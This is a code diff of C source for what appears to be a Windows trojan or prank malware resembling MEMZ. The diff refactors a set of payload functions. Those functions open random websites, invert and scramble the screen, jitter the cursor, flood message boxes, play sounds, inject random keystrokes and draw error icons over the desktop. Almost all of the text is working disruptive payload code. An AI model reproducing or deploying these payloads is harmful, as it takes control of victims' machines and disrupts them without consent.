@@ -43,7 +43,7 @@ DWORD WINAPI payloadThread(LPVOID parameter) {
 #ifdef CLEAN
 		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
 			if (payload->delay-- == 0) {
-				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime);
+				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
 			}
 
 			payload->runtime++;
@@ -63,13 +63,17 @@ DWORD WINAPI payloadThread(LPVOID parameter) {
 	}
 }
 
-int payloadExecute(int times, int runtime) {
+int payloadExecute(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
 
-	return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
+	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
 }
 
-int payloadBlink(int times, int runtime) {
+int payloadBlink(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	RECT rekt;
@@ -77,22 +81,26 @@ int payloadBlink(int times, int runtime) {
 	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	return 100;
+	out: return 100;
 }
 
-int payloadCursor(int times, int runtime) {
+int payloadCursor(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	POINT cursor;
 	GetCursorPos(&cursor);
 
 	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));
 
-	return 2;
+	out: return 2;
 }
 
-int payloadMessageBox(int times, int runtime) {
+int payloadMessageBox(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
 
-	return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
+	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
 }
 
 DWORD WINAPI messageBoxThread(LPVOID parameter) {
@@ -121,10 +129,11 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
-int payloadChangeText(int times, int runtime) {
+int payloadChangeText(PAYLOADFUNC) {
+	PAYLOADHEAD
 	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
 
-	return 50;
+	out: return 50;
 }
 
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
@@ -140,12 +149,16 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 	return TRUE;
 }
 
-int payloadSound(int times, int runtime) {
+int payloadSound(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	PlaySoundA(sounds[random() % nSounds], NULL, SND_ASYNC);
-	return 20 + (random() % 20);
+	out: return 20 + (random() % 20);
 }
 
-int payloadPuzzle(int times, int runtime) {
+int payloadPuzzle(PAYLOADFUNC) {
+	PAYLOADHEAD
+	
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	RECT rekt;
@@ -161,20 +174,24 @@ int payloadPuzzle(int times, int runtime) {
 	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	return 200.0 / (times / 5.0 + 1) + 3;
+	out: return 200.0 / (times / 5.0 + 1) + 3;
 }
 
-int payloadKeyboard(int times, int runtime) {
+int payloadKeyboard(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	INPUT input;
 
 	input.type = INPUT_KEYBOARD;
 	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
 	SendInput(1, &input, sizeof(INPUT));
 
-	return 300 + (random() % 400);
+	out: return 300 + (random() % 400);
 }
 
-int payloadPIP(int times, int runtime) {
+int payloadPIP(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	RECT rekt;
@@ -182,10 +199,12 @@ int payloadPIP(int times, int runtime) {
 	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
 	ReleaseDC(hwnd, hdc);
 
-	return 200.0 / (times / 5.0 + 1) + 4;
+	out: return 200.0 / (times / 5.0 + 1) + 4;
 }
 
-int payloadDrawErrors(int times, int runtime) {
+int payloadDrawErrors(PAYLOADFUNC) {
+	PAYLOADHEAD
+
 	int ix = GetSystemMetrics(SM_CXICON) / 2;
 	int iy = GetSystemMetrics(SM_CYICON) / 2;
 	
@@ -203,5 +222,5 @@ int payloadDrawErrors(int times, int runtime) {
 	
 	ReleaseDC(hwnd, hdc);
 
-	return 2;
+	out: return 2;
 }
